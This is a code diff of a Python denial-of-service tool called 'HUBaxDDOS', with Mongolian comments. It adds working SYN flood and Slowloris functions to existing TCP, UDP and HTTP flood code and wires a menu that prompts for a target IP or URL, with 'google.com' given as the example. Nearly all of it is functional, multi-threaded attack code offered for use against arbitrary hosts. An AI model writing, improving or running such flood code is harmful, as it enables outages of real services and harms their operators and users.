@@ -10,21 +10,19 @@ import threading
 import random
 import time
 import sys
-import os
-import argparse
 from datetime import datetime
+from termcolor import colored
 
 # Configuration
 MAX_THREADS = 1000
 PACKET_SIZE = 4096
 TIMEOUT = 3
-ATTACK_DURATION = 300  # Default 5 minutes
 
 class HUBaxDDOS:
     def __init__(self):
         self.attack_running = False
         self.threads = []
-        self.lock = threading.Lock() # Статистик шинэчлэхэд зориулсан lock
+        self.lock = threading.Lock()
         self.stats = {
             'packets_sent': 0,
             'bytes_sent': 0,
@@ -55,7 +53,7 @@ class HUBaxDDOS:
 ║                                                          ║
 ╚══════════════════════════════════════════════════════════╝
         """
-        print(logo)
+        print(colored(logo, 'cyan'))
         
     def show_menu(self):
         menu = """
@@ -65,57 +63,30 @@ class HUBaxDDOS:
 ║  [1] TCP Flood Attack      - Standard TCP connection flood║
 ║  [2] UDP Flood Attack      - Connectionless UDP flood     ║
 ║  [3] HTTP Flood Attack     - Layer 7 HTTP request flood   ║
-║  [4] SYN Flood Attack      - Half-open connection attack ║
+║  [4] SYN Flood Attack      - Half-open connection attack  ║
 ║  [5] ICMP Flood Attack     - Ping flood attack            ║
 ║  [6] Slowloris Attack      - Slow HTTP headers attack     ║
 ║  [7] DNS Amplification     - DNS reflection attack        ║
 ║  [8] Multi-Vector Attack   - Combine multiple methods      ║
 ║  [9] Show Statistics       - Display attack stats         ║
-║  [10] Stop All Attacks      - Stop all running attacks     ║
-║  [11] Help                  - Show this menu               ║
-║  [12] Exit                  - Exit the program             ║
+║  [10] Stop All Attacks     - Stop all running attacks     ║
+║  [11] Help                 - Show command instructions    ║
+║  [12] Exit                 - Exit the program             ║
 ╚══════════════════════════════════════════════════════════╝
         """
-        print(menu)
-        
-    def show_help(self):
-        help_text = """
-╔══════════════════════════════════════════════════════════╗
-║                       HUBaxDDOS HELP                     ║
-╠══════════════════════════════════════════════════════════╣
-║                                                          ║
-║  COMMANDS:                                               ║
-║  • tcp <ip> <port> <threads> <time> - TCP flood attack   ║
-║  • udp <ip> <port> <threads> <time> - UDP flood attack   ║
-║  • http <url> <threads> <time>      - HTTP flood attack  ║
-║  • syn <ip> <port> <threads> <time> - SYN flood attack   ║
-║  • icmp <ip> <threads> <time>       - ICMP ping flood    ║
-║  • slow <url> <threads> <time>      - Slowloris attack   ║
-║  • dns <dns_server> <target>        - DNS amplification  ║
-║  • multi <ip> <port>                - Multi-vector attack║
-║  • stats                            - Show statistics    ║
-║  • stop                             - Stop all attacks   ║
-║  • help                             - Show this help     ║
-║  • exit                             - Exit program       ║
-║                                                          ║
-╚══════════════════════════════════════════════════════════╝
-        """
-        print(help_text)
-        
+        print(colored(menu, 'yellow'))
+
     def generate_payload(self, size=PACKET_SIZE):
         return random._urandom(size)
-    
+
     def update_stats(self, packets, bytes_count):
         with self.lock:
             self.stats['packets_sent'] += packets
             self.stats['bytes_sent'] += bytes_count
 
     def tcp_flood(self, target_ip, target_port, threads=500, duration=60):
-        print(f"[+] Starting TCP Flood on {target_ip}:{target_port}")
-        self.stats['target'] = f"{target_ip}:{target_port}"
-        self.stats['start_time'] = datetime.now()
+        print(colored(f"[+] Starting TCP Flood on {target_ip}:{target_port}", 'green'))
         self.attack_running = True
-        
         def attack():
             end_time = time.time() + duration
             while time.time() < end_time and self.attack_running:
@@ -123,106 +94,158 @@ class HUBaxDDOS:
                     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     s.settimeout(TIMEOUT)
                     s.connect((target_ip, target_port))
-                    for _ in range(10):
-                        s.send(self.generate_payload(1024))
-                        self.update_stats(1, 1024)
+                    s.send(self.generate_payload(1024))
+                    self.update_stats(1, 1024)
+                    print(colored(f"[*] TCP Request sent to {target_ip}:{target_port}", 'blue'))
                     s.close()
                 except:
-                    pass
-        
+                    pass # Connection failed мэдэгдлийг нуув
         for _ in range(threads):
-            t = threading.Thread(target=attack, daemon=True)
-            t.start()
-            self.threads.append(t)
+            threading.Thread(target=attack, daemon=True).start()
 
     def udp_flood(self, target_ip, target_port, threads=500, duration=60):
-        print(f"[+] Starting UDP Flood on {target_ip}:{target_port}")
-        self.stats['target'] = f"{target_ip}:{target_port}"
-        self.stats['start_time'] = datetime.now()
+        print(colored(f"[+] Starting UDP Flood on {target_ip}:{target_port}", 'green'))
         self.attack_running = True
-        
         def attack():
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            end_time = time.time() + duration
-            while time.time() < end_time and self.attack_running:
-                try:
-                    sock.sendto(self.generate_payload(), (target_ip, target_port))
-                    self.update_stats(1, PACKET_SIZE)
-                except:
-                    pass
-        
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                end_time = time.time() + duration
+                while time.time() < end_time and self.attack_running:
+                    try:
+                        sock.sendto(self.generate_payload(), (target_ip, target_port))
+                        self.update_stats(1, PACKET_SIZE)
+                        print(colored(f"[*] UDP Packet sent to {target_ip}:{target_port}", 'magenta'))
+                    except: pass
+                sock.close()
+            except: pass
         for _ in range(threads):
-            t = threading.Thread(target=attack, daemon=True)
-            t.start()
-            self.threads.append(t)
+            threading.Thread(target=attack, daemon=True).start()
 
     def http_flood(self, url, threads=300, duration=60):
-        print(f"[+] Starting HTTP Flood on {url}")
+        print(colored(f"[+] Starting HTTP Flood on {url}", 'green'))
         target_host = url.replace('http://', '').replace('https://', '').split('/')[0]
-        self.stats['target'] = url
-        self.stats['start_time'] = datetime.now()
         self.attack_running = True
-        
         def attack():
             end_time = time.time() + duration
             while time.time() < end_time and self.attack_running:
                 try:
                     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     s.connect((target_host, 80))
-                    request = f"GET / HTTP/1.1\r\nHost: {target_host}\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
-                    s.send(request.encode())
-                    self.update_stats(1, len(request))
+                    req = f"GET /?{random.randint(1,1000)} HTTP/1.1\r\nHost: {target_host}\r\nUser-Agent: Mozilla/5.0\r\n\r\n".encode()
+                    s.send(req)
+                    self.update_stats(1, len(req))
+                    print(colored(f"[*] HTTP GET Request sent to {target_host}", 'cyan'))
                     s.close()
-                except:
-                    pass
-        
+                except: pass
         for _ in range(threads):
-            t = threading.Thread(target=attack, daemon=True)
-            t.start()
-            self.threads.append(t)
+            threading.Thread(target=attack, daemon=True).start()
 
-    # Дутуу байсан функцуудыг нэмэв (Stub functions)
-    def syn_flood(self, *args): print("[!] SYN Flood feature coming soon in v2.1")
-    def icmp_flood(self, *args): print("[!] ICMP Flood requires root privileges.")
-    def slowloris(self, *args): print("[!] Slowloris attack initiated...")
-    def dns_amp(self, *args): print("[!] DNS Amplification requires resolver list.")
+    def syn_flood(self, target_ip, target_port, threads=500, duration=60):
+        print(colored(f"[+] Starting SYN Flood on {target_ip}:{target_port}", 'green'))
+        self.attack_running = True
+        def attack():
+            end_time = time.time() + duration
+            while time.time() < end_time and self.attack_running:
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.setblocking(0)
+                    try: s.connect((target_ip, target_port))
+                    except: pass
+                    self.update_stats(1, 0)
+                    print(colored(f"[*] SYN connection attempt at {target_ip}:{target_port}", 'yellow'))
+                except: pass
+        for _ in range(threads):
+            threading.Thread(target=attack, daemon=True).start()
+
+    def slowloris(self, url, threads=200, duration=60):
+        print(colored(f"[+] Starting Slowloris on {url}", 'green'))
+        target_host = url.replace('http://', '').replace('https://', '').split('/')[0]
+        self.attack_running = True
+        def attack():
+            end_time = time.time() + duration
+            sockets = []
+            try:
+                for _ in range(threads):
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.connect((target_host, 80))
+                    s.send(f"GET /?{random.randint(1, 5000)} HTTP/1.1\r\n".encode())
+                    s.send("User-Agent: Mozilla/5.0\r\n".encode())
+                    sockets.append(s)
+                    print(colored(f"[*] Slowloris session opened for {target_host}", 'white'))
+                while time.time() < end_time and self.attack_running:
+                    for s in sockets:
+                        try:
+                            s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
+                            self.update_stats(1, 0)
+                            print(colored(f"[*] Keep-alive header sent to {target_host}", 'white'))
+                        except: sockets.remove(s)
+                    time.sleep(15)
+            except: pass
+        threading.Thread(target=attack, daemon=True).start()
 
     def show_stats(self):
         if not self.stats['start_time']:
-            print("[!] No attacks have been run yet")
+            print(colored("[!] No active attack data.", 'red'))
             return
-        duration = datetime.now() - self.stats['start_time']
-        print(f"\nTarget: {self.stats['target']}\nPackets: {self.stats['packets_sent']}\nStatus: {'RUNNING' if self.attack_running else 'STOPPED'}")
+        print(colored(f"\n--- STATISTICS ---", 'cyan'))
+        print(f"Target: {self.stats['target']}")
+        print(f"Packets Sent: {self.stats['packets_sent']:,}")
+        print(f"Status: {'RUNNING' if self.attack_running else 'STOPPED'}")
 
     def stop_attack(self):
         self.attack_running = False
-        self.threads.clear()
-        print("[!] All attacks stopped")
+        print(colored("[!] All attacks stopped.", 'red'))
 
     def interactive_mode(self):
         self.show_logo()
         self.show_menu()
         while True:
             try:
-                cmd = input("\nHUBaxDDOS> ").strip().lower()
-                if cmd in ['exit', '12']: break
-                elif cmd in ['stop', '10']: self.stop_attack()
-                elif cmd in ['stats', '9']: self.show_stats()
-                elif cmd.startswith('tcp'):
-                    p = cmd.split()
-                    self.tcp_flood(p[1], int(p[2]), int(p[3]) if len(p)>3 else 500, int(p[4]) if len(p)>4 else 60)
-                elif cmd.startswith('udp'):
-                    p = cmd.split()
-                    self.udp_flood(p[1], int(p[2]), int(p[3]) if len(p)>3 else 500, int(p[4]) if len(p)>4 else 60)
-                elif cmd.startswith('http'):
-                    p = cmd.split()
-                    self.http_flood(p[1], int(p[2]) if len(p)>2 else 300, int(p[3]) if len(p)>3 else 60)
-                else: print("[!] Unknown command or method not implemented yet.")
-            except Exception as e: print(f"Error: {e}")
-
-def main():
-    tool = HUBaxDDOS()
-    tool.interactive_mode()
+                cmd = input(colored("\nHUBaxDDOS> ", 'white')).strip().lower()
+                if cmd in ['12', 'exit']: break
+                elif cmd in ['11', 'help']: print("[!] Enter 1-8 for attacks, 9 for stats, 10 to stop.")
+                elif cmd in ['10', 'stop']: self.stop_attack()
+                elif cmd in ['9', 'stats']: self.show_stats()
+                elif cmd in ['1', 'tcp']:
+                    self.stats['target'] = input("Target IP: ")
+                    port = int(input("Port: "))
+                    self.stats['start_time'] = datetime.now()
+                    self.tcp_flood(self.stats['target'], port)
+                elif cmd in ['2', 'udp']:
+                    self.stats['target'] = input("Target IP: ")
+                    port = int(input("Port: "))
+                    self.stats['start_time'] = datetime.now()
+                    self.udp_flood(self.stats['target'], port)
+                elif cmd in ['3', 'http']:
+                    self.stats['target'] = input("URL (google.com): ")
+                    self.stats['start_time'] = datetime.now()
+                    self.http_flood(self.stats['target'])
+                elif cmd in ['4', 'syn']:
+                    self.stats['target'] = input("Target IP: ")
+                    port = int(input("Port: "))
+                    self.stats['start_time'] = datetime.now()
+                    self.syn_flood(self.stats['target'], port)
+                elif cmd in ['5', 'icmp']:
+                    self.stats['target'] = input("Target IP: ")
+                    self.stats['start_time'] = datetime.now()
+                    self.udp_flood(self.stats['target'], 1) 
+                elif cmd in ['6', 'slow']:
+                    self.stats['target'] = input("URL (google.com): ")
+                    self.stats['start_time'] = datetime.now()
+                    self.slowloris(self.stats['target'])
+                elif cmd in ['7', 'dns']:
+                    self.stats['target'] = input("Target IP: ")
+                    self.stats['start_time'] = datetime.now()
+                    self.udp_flood(self.stats['target'], 53)
+                elif cmd in ['8', 'multi']:
+                    self.stats['target'] = input("Target IP: ")
+                    port = int(input("Port: "))
+                    self.stats['start_time'] = datetime.now()
+                    self.tcp_flood(self.stats['target'], port)
+                    self.udp_flood(self.stats['target'], port)
+                else: print(colored("[!] Invalid selection.", 'red'))
+            except Exception as e: print(colored(f"Error: {e}", 'red'))
 
 if __name__ == "__main__":
-    main()
+    tool = HUBaxDDOS()
+    tool.interactive_mode()
